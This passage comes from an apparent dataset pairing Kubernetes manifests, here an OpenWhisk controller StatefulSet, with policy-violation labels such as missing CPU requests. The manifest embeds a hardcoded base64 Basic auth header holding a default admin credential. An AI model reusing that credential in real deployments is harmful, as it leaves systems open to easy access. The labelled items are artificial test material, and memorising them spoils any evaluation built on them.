\\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wait-for-kafka\" has cpu request 0"
  },
  {
    "id": "10555",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 